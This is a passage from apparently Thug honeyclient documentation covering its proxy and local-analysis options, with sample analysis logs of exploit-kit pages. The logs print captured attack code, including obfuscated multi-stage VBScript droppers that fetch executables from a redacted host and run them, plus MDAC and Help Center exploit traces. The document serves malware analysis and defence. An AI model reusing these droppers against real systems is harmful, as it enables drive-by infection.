<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.1.0
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.7.0.0
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_40
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_39
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_38
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_37
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_36
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_35
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_34
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_33
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_32
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_31
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_30
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_29
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_28
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_27
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_26
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_25
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_24
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_23
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_22
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_21
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_20
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_19
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_18
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_17
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_16
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_15
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_14
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_13
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_12
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_11
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_10
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_09
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: javaplugin.170_08
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> ActiveXObject: javaplugin.170_07
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.7.0.0
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: AdobeReader version: 9,1,0,0
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Flash version: 10,0,64,0
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Java version: 1,7,0,7
</pre></div>
</div>
</div>
<div class="section" id="proxy-support">
<h2>Proxy support<a class="headerlink" href="#proxy-support" title="Permalink to this headline">¶</a></h2>
<p>Another really useful option is <em>-p (&#8211;proxy)</em> which allows to specify a proxy. Currently Thug
supports HTTP, SOCKS4 and SOCKS5 proxy using the following format</p>
<blockquote>
<div>scheme://[username:password&#64;]host:port
(supported schemes: http, socks4, socks5)</div></blockquote>
<p>This option allows Thug to make use of Tor in order to anonymize the access to a malicious
page. The trick is quite simple and requires a Tor instance up and running. Simply run Thug
using <em>socks5://127.0.0.1:9050</em> as proxy and your real IP address will not be revealed.</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~ $ thug -p socks5://127.0.0.1:9050 <span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
<span class="o">[</span>2012-07-02 19:22:14<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07 <span class="o">(</span>Status: 200, Referrer: None<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:22:14<span class="o">]</span> &lt;applet <span class="nv">archive</span><span class="o">=</span><span class="s2">&quot;Ryp.jar&quot;</span> <span class="nv">code</span><span class="o">=</span><span class="s2">&quot;sIda.sIda&quot;</span>&gt;&lt;param <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;b&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;</span>&gt;&lt;/param&gt;&lt;/applet&gt;
<span class="o">[</span>2012-07-02 19:22:14<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> Ryp.jar --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar
<span class="o">[</span>2012-07-02 19:22:16<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:22:17<span class="o">]</span> Saving applet Ryp.jar
<span class="o">[</span>2012-07-02 19:22:17<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span>2012-07-02 19:22:17<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span>2012-07-02 19:22:18<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span>2012-07-02 19:22:18<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span>2012-07-02 19:22:18<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span>2012-07-02 19:22:18<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span>2012-07-02 19:22:18<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span>2012-07-02 19:22:18<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span>2012-07-02 19:22:18<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>adodb.stream<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:22:18<span class="o">]</span> ActiveXObject: adodb.stream
<span class="o">[</span>2012-07-02 19:22:18<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>Shell.Application<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:22:18<span class="o">]</span> ActiveXObject: shell.application
<span class="o">[</span>2012-07-02 19:22:18<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>msxml2.XMLHTTP<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:22:18<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span>2012-07-02 19:22:18<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Fetching from URL http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span>2
<span class="o">[</span>2012-07-02 19:22:22<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span> <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:22:23<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Saving File: d328b5a123bce1c0d20d763ad745303a
<span class="o">[</span>2012-07-02 19:22:23<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> send
<span class="o">[</span>2012-07-02 19:22:23<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> open
<span class="o">[</span>2012-07-02 19:22:23<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Write
<span class="o">[</span>2012-07-02 19:22:23<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> SaveToFile <span class="o">(</span>.//..//e9a458c.exe<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:22:23<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Close
<span class="o">[</span>2012-07-02 19:22:23<span class="o">]</span> <span class="o">[</span>Shell.Application ActiveX<span class="o">]</span> ShellExecute command: .//..//e9a458c.exe
<span class="o">[</span>2012-07-02 19:22:23<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> ./data/ap1.php?f<span class="o">=</span>b081d --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d
<span class="o">[</span>2012-07-02 19:22:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:22:30<span class="o">]</span> Microsoft Internet Explorer HCP Scheme Detected
<span class="o">[</span>2012-07-02 19:22:30<span class="o">]</span> Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
<span class="o">[</span>2012-07-02 19:22:30<span class="o">]</span> <span class="o">[</span>AST<span class="o">]</span>: Eval argument length &gt; 64
<span class="o">[</span>2012-07-02 19:22:30<span class="o">]</span> <span class="o">[</span>Windows Script Host Run<span class="o">]</span> Command:
cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span>2<span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe

<span class="o">[</span>2012-07-02 19:22:30<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 1<span class="o">]</span> Code:
cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span>2<span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe
<span class="o">[</span>2012-07-02 19:22:30<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 1<span class="o">]</span> Downloading from URL http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span>0
<span class="o">[</span>2012-07-02 19:22:32<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span> <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:22:32<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 1<span class="o">]</span> Saving file d26b9b1a1f667004945d1d000cf4f19e
<span class="o">[</span>2012-07-02 19:22:32<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 2<span class="o">]</span> Code:
<span class="nv">w</span><span class="o">=</span>3000:x<span class="o">=</span>200:y<span class="o">=</span>1:z<span class="o">=</span>false:a <span class="o">=</span> <span class="s2">&quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;</span>:Set <span class="nv">e</span> <span class="o">=</span> Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>:Set <span class="nv">f</span><span class="o">=</span>e.GetSpecialFolder<span class="o">(</span>2<span class="o">)</span>:b <span class="o">=</span> f <span class="p">&amp;</span> <span class="s2">&quot;\exe.ex2&quot;</span>:b<span class="o">=</span>Replace<span class="o">(</span>b,Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="s2">&quot;e&quot;</span><span class="o">)</span>:OT <span class="o">=</span> <span class="s2">&quot;GET&quot;</span>:Set <span class="nv">c</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;PTTHLMX.2LMXSM&quot;</span><span class="o">))</span>:Set <span class="nv">d</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;ertS.BDODA&quot;</span><span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;am&quot;</span><span class="o">)</span>
Set <span class="nv">o</span><span class="o">=</span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>
On Error resume next
c.open OT, a, z:c.send<span class="o">()</span>
If c.Status <span class="o">=</span> x Then
d.Open:d.Type <span class="o">=</span> y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
End If
Set <span class="nv">w</span><span class="o">=</span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;llehS.&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;tpi&quot;</span><span class="p">&amp;</span><span class="s2">&quot;rcSW&quot;</span><span class="o">))</span>
Eval<span class="o">(</span>Replace<span class="o">(</span><span class="s2">&quot;W.ex2c b&quot;</span>, Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>, <span class="s2">&quot;E&quot;</span><span class="o">))</span>
W.eXeC <span class="s2">&quot;taskkill /F /IM wm&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;player.e&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;xe&quot;</span>:W.eXeC <span class="s2">&quot;taskkill /F /IM realplay.ex&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;e&quot;</span>:Set <span class="nv">g</span><span class="o">=</span>o.GetFile<span class="o">(</span>e.GetSpecialFolder<span class="o">(</span>3-1<span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;\&quot; &amp; StrReverse(&quot;</span>bv.l<span class="s2">&quot;) &amp; &quot;</span>s<span class="s2">&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;</span>g.Delete<span class="s2">&quot;)</span>

<span class="s2">[2012-07-02 19:22:32] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d</span>
<span class="s2">[2012-07-02 19:22:38] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:22:39] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a</span>
<span class="s2">[2012-07-02 19:22:39] &lt;object classid=&quot;</span>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000<span class="s2">&quot; height=&quot;</span>10<span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; width=&quot;</span>10<span class="s2">&quot;&gt;&lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span>0<span class="s2">&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span>10<span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span>10<span class="s2">&quot;&gt;&lt;/embed&gt;&lt;/object&gt;</span>
<span class="s2">[2012-07-02 19:22:39] &lt;param name=&quot;</span>b<span class="s2">&quot; value=&quot;</span>56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:22:39] &lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:22:39] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:22:46] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:22:46] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="s2">[2012-07-02 19:22:46] &lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:22:46] &lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span>0<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:22:46] &lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span>10<span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span>10<span class="s2">&quot;&gt;&lt;/embed&gt;</span>
<span class="s2">[2012-07-02 19:22:46] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:22:49] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:22:49] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
</pre></div>
</div>
</div>
<div class="section" id="local-analysis">
<h2>Local Analysis<a class="headerlink" href="#local-analysis" title="Permalink to this headline">¶</a></h2>
<p>May you need to analyze a locally saved page Thug provides the <em>-l (&#8211;local)</em> option to you.
Using such option is really simple and could turn to be really useful for testing and for
later (manual or automated) analysis (see also <em>Web Cache</em>)</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~/thug/src $ thug -l ../samples/exploits/4042.html
<span class="o">[</span>2012-07-03 00:12:23<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:DCE2F8B1-A520-11D4-8FD0-00D0B7730277&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;target&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-07-03 00:12:23<span class="o">]</span> ActiveXObject: DCE2F8B1-A520-11D4-8FD0-00D0B7730277
<span class="o">[</span>2012-07-03 00:12:23<span class="o">]</span> <span class="o">[</span>Yahoo! Messenger 8.x Ywcvwr ActiveX<span class="o">]</span> Server Console Overflow
<span class="o">[</span>2012-07-03 00:12:23<span class="o">]</span> UINT WINAPI WinExec <span class="o">(</span>
        <span class="nv">LPCSTR</span> <span class="o">=</span> <span class="nv">0x025d4b30</span> <span class="o">=</span>&gt;
                <span class="o">=</span> <span class="s2">&quot;calc.exe&quot;</span><span class="p">;</span>
        UINT <span class="nv">uCmdShow</span> <span class="o">=</span> 0<span class="p">;</span>
<span class="o">)</span> <span class="o">=</span>  32<span class="p">;</span>
void ExitProcess <span class="o">(</span>
        UINT <span class="nv">uExitCode</span> <span class="o">=</span> 0<span class="p">;</span>
<span class="o">)</span> <span class="o">=</span>  0<span class="p">;</span>
</pre></div>
</div>
<p>If you need to prevent remote content fetching while analyzing a locally saved page Thug
provides the <em>-x (&#8211;local-nofetch)</em> option to you. Let&#8217;s take a look at an example.</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~/thug/src $ thug -l ../samples/exploits/55875.html
<span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=utf-8&quot;</span> http-equiv<span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;Acer Inc.&#39;s shares fell sharply Tuesday, one day after the Taiwanese computer maker said it would acquire Gateway Inc. for </span><span class="nv">$710</span><span class="s2"> million.  Acer said it ...&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;description&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;index,follow&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;robots&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;Copyright (c)2007-2007 groundhogtech.com. All right reserved.&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;copyright&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;WordPress 2.2.1&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;generator&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> <span class="o">[</span>Meta<span class="o">]</span> Generator: WordPress 2.2.1
<span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;document&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;resource-type&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/favicon.ico&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;shortcut icon&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/favicon.ico <span class="o">(</span>Status: 204, Referrer: None<span class="o">)</span>
<span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/favicon.ico <span class="o">(</span>Content-type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: d41d8cd98f00b204e9800998ecf8427e<span class="o">)</span>
<span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css&quot;</span> <span class="nv">media</span><span class="o">=</span><span class="s2">&quot;screen&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:32:29<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css <span class="o">(</span>Status: 200, Referrer: None<span class="o">)</span>
<span class="o">[</span>2013-01-08 10:32:29<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css <span class="o">(</span>Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: 64f3fd00b16de9316bf2b7b57925f4ca<span class="o">)</span>
<span class="o">[</span>2013-01-08 10:32:29<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/feed/&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;alternate&quot;</span> <span class="nv">title</span><span class="o">=</span><span class="s2">&quot;Groundhogtech RSS Feed&quot;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;application/rss+xml&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:32:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/feed/ <span class="o">(</span>Status: 200, Referrer: None<span class="o">)</span>
